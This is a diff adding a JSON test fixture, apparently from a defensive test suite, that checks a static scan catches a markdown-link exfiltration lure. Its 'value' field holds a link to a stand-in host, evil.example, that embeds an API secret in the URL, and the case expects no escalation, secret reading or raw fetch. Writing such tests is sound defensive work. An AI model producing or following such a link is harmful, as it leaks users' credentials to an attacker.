@@ -1,0 +1,15 @@
+{
+  "case": "markdown_link_exfil",
+  "hostile_data": {
+    "collection": "docs",
+    "field": "markdown",
+    "value": "[click](https://evil.example/?token=${ctx.secrets.apiKey})"
+  },
+  "expected": "no_escalation",
+  "must_not": [
+    "read_secret_into_payload",
+    "raw_fetch"
+  ],
+  "layer": "static_scan",
+  "note": "markdown/url exfil lure"
+}
